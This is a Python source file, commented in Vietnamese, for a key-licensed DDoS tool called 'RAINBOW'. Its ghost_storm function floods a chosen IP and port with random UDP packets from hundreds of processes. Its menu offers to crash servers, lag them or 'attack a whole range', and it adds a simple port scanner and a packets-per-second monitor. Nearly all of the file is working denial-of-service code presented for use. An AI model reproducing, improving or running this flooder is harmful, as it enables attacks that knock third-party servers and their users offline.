import os, socket, multiprocessing, sys, time, random, json, ipaddress
from datetime import datetime, timedelta
from urllib.request import urlopen

# --- HỆ THỐNG MÀU LED ---
# Danh sách màu theo thứ tự cầu vồng để chuyển đổi mượt mà
LED_COLORS = [
    '\033[31m', # Đỏ
    '\033[38;5;208m', # Cam
    '\033[33m', # Vàng
    '\033[32m', # Lục
    '\033[36m', # Lam
    '\033[34m', # Chàm
    '\033[35m'  # Tím
]
RESET = '\033[0m'
BOLD = '\033[1m'
CYAN = '\033[36m'
WHITE = '\033[37m'
RED = '\033[31m'
YELLOW = '\033[33m'
ORANGE = '\033[38;5;208m'
GREEN = '\033[32m'
PURPLE = '\033[35m'
BLUE = '\033[34m'

KEYS_DATABASE = {"LONG-1D-X8A2B9": 1, "LONG-1W-Q7C4M1": 7, "LONG-1M-Z0P5K2": 30, "LONG-1Y-VVIP99": 365, "LONG-ADMIN-999": 9999}
DB_FILE = ".user_auth.json"

def get_my_ip():
    try: return urlopen('https://api.ipify.org', timeout=3).read().decode('utf8')
    except: return "127.0.0.1"

def load_auth_data():
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, "r") as f: return json.load(f)
        except: return {}
    return {}

def save_auth_data(ip, expiry):
    with open(DB_FILE, "w") as f: json.dump({ip: expiry}, f)

# ==============================================================================
# [ VŨ KHÍ & TIỆN ÍCH ]
# ==============================================================================
def ghost_storm(ip, port, counter):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        sock.connect((ip, port))
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 10 * 1024 * 1024)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_TOS, 0xB8)
    except: pass
    while True:
        try:
            sock.send(os.urandom(random.randint(1200, 1472)))
            counter.value += 1
        except: continue

def scan_port(ip):
    print(f"{YELLOW}[*] Đang quét lỗ hổng trên {ip}...{RESET}")
    open_p = []
    common = [21, 22, 80, 443, 3306, 25565, 8080, 19132]
    for p in common:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.3)
        if s.connect_ex((ip, p)) == 0: open_p.append(p)
        s.close()
    print(f"{GREEN}[+] Các cổng đang mở: {open_p}{RESET}")
    input(f"{ORANGE}Nhấn Enter để quay lại Menu...{RESET}")

def monitor(counter, target):
    last_val = 0
    color_idx = 0
    while True:
        time.sleep(0.7) # Tốc độ hiện dòng (chậm lại cho giống LED)
        curr = counter.value
        pps = (curr - last_val) * (1/0.7)
        last_val = curr
        mib = (pps * 1.4) / 1024
        
        # Đổi màu từ từ theo danh sách LED_COLORS
        color = LED_COLORS[color_idx % len(LED_COLORS)]
        color_idx += 1
        print(f"{color}[+] {int(pps):,} PPS | {mib:.1f} MiB/s | MỤC TIÊU: {target}{RESET}")

def show_rainbow_header():
    # Chọn một màu chủ đạo ngẫu nhiên cho mỗi lần hiện Menu
    c = random.choice(LED_COLORS)
    print(f"{c}    ██████╗  █████╗ ██╗███╗   ██╗██████╗  ██████╗ ██╗    ██╗")
    print(f"{c}    ██╔══██╗██╔══██╗██║████╗  ██║██╔══██╗██╔═══██╗██║    ██║")
    print(f"{c}    ██████╔╝███████║██║██╔██╗ ██║██████╔╝██║   ██║██║ █╗ ██║")
    print(f"{c}    ██╔══██╗██╔══██║██║██║╚██╗██║██╔══██╗██║   ██║██║███╗██║")
    print(f"{c}    ██║  ██║██║  ██║██║██║ ╚████║██████╔╝╚██████╔╝╚███╔███╔╝")
    print(f"{c}    ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝╚═════╝  ╚═════╝  ╚══╝╚══╝ ")
    print(f"\n{CYAN}{BOLD}   >>> v31.2 LED SLOW - ADMIN: NGUYỄN THÀNH LONG <<<   {RESET}")
    print(f"{WHITE}================================================================================{RESET}")

def check_key():
    os.system('clear' if os.name == 'posix' else 'cls')
    my_ip = get_my_ip()
    auth = load_auth_data()
    show_rainbow_header()
    if my_ip in auth:
        expiry = datetime.strptime(auth[my_ip], "%Y-%m-%d %H:%M:%S")
        if datetime.now() < expiry:
            print(f"{GREEN}[✓] IP Ghi nhớ: {my_ip} | Hạn dùng đến: {expiry}{RESET}")
            time.sleep(1); return True
    key = input(f"{ORANGE}[?] Nhập Key Premium: {RESET}").strip()
    if key in KEYS_DATABASE:
        expiry = datetime.now() + timedelta(days=KEYS_DATABASE[key])
        save_auth_data(my_ip, expiry.strftime("%Y-%m-%d %H:%M:%S"))
        print(f"{GREEN}[✓] Kích hoạt thành công!{RESET}"); time.sleep(1); return True
    else:
        print(f"{RED}[✗] Sai Key!{RESET}"); time.sleep(2); sys.exit()

def main():
    if not check_key(): return
    while True:
        os.system('clear' if os.name == 'posix' else 'cls')
        show_rainbow_header()
        print(f"{RED}[1] {BOLD}Ddos server (làm sập server){RESET}")
        print(f"{YELLOW}[2] {BOLD}Làm server ping cao (lag server){RESET}")
        print(f"{GREEN}[3] {BOLD}Ddos tất cả ip (tấn công cả dải mạng){RESET}")
        print(f"{BLUE}[4] {BOLD}Dò cổng của server (scan port){RESET}")
        print(f"{PURPLE}[0] {BOLD}Thoát{RESET}")
        
        choice = input(f"\n{CYAN}Long chọn vũ khí: {RESET}")
        if choice == '0': sys.exit()
        target = input(f"{BOLD}IP/Domain mục tiêu: {RESET}")
        
        if choice == '4': scan_port(target); continue
        
        try:
            if choice != '3': port = int(input(f"{BOLD}Port: {RESET}"))
            trigger_time = int(input(f"{BOLD}Hẹn giờ kích nổ (giây): {RESET}"))
        except: continue

        # --- LOGIC ĐẾM NGƯỢC ĐỔI MÀU LED CHẬM ---
        for i in range(trigger_time, 0, -1):
            color = LED_COLORS[i % len(LED_COLORS)]
            sys.stdout.write(f"\r{color}[!] Chuẩn bị khai hỏa sau: {i} giây...{RESET}")
            sys.stdout.flush()
            time.sleep(1)
        
        print(f"\n{RED}[+] KHAI HỎA TỔNG LỰC !!!{RESET}\n")

        shared_counter = multiprocessing.Value('L', 0, lock=False)
        procs = []
        
        # (Lấy hàm ghost_storm làm mặc định cho tốc độ)
        for _ in range(os.cpu_count() * 80):
            p = multiprocessing.Process(target=ghost_storm, args=(target, port if choice != '3' else 80, shared_counter))
            p.daemon = True; p.start(); procs.append(p)

        m = multiprocessing.Process(target=monitor, args=(shared_counter, target))
        m.daemon = True; m.start()
        
        try:
            while True: time.sleep(1)
        except KeyboardInterrupt:
            for p in procs: p.terminate()
            m.terminate(); print(f"\n{PURPLE}[!] Đã thu quân.{RESET}"); time.sleep(1)

if __name__ == "__main__":
    main()